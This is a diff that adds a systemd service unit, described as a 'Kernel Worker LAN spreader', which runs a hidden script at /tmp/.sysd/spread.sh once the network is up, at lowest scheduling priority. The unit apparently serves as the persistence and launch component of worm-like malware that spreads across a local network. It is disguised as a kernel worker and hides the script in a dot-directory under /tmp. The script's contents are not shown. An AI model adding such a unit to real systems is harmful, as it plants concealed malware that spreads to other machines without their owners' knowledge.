@@ -1,0 +1,8 @@
+[Unit]
+Description=Kernel Worker LAN spreader
+After=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/tmp/.sysd/spread.sh
+Nice=19
